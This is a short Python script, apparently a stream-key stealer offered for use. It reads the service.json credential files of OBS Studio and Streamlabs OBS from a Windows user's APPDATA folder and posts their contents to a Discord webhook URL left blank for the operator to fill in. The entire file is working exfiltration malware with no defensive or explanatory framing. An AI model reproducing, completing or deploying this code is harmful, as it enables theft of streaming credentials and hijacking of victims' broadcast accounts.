import os
import re
import json
from discord_webhook import DiscordWebhook, DiscordEmbed
from urllib.request import Request, urlopen
import os.path
from os import path
#enter you webhook url here
WEBHOOK_URL = ""


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

SLOBS = roaming + '\\slobs-client\\service.json'
OBS = roaming + '\\obs-studio\\basic\\profiles\\Untitled\\service.json'

if path.exists(f"{OBS}"):
    obs = open(f"{OBS}" , "r")
    obskey = obs.read()
    obs.close()
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**OBS** ```json\n{obskey}```"))
    response = f.execute()
else:
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**OBS** ```json\n OBS Not Found```"))
    response = f.execute()

if path.exists(f"{SLOBS}"):
    slobs = open(f"{SLOBS}", "r")
    slobskey = slobs.read()
    slobs.close()
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**SLOBS** ```json\n{slobskey}```"))
    response = f.execute()
else:
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**SLOBS** ```json\n SLOBS Not Found```"))
    response = f.execute()

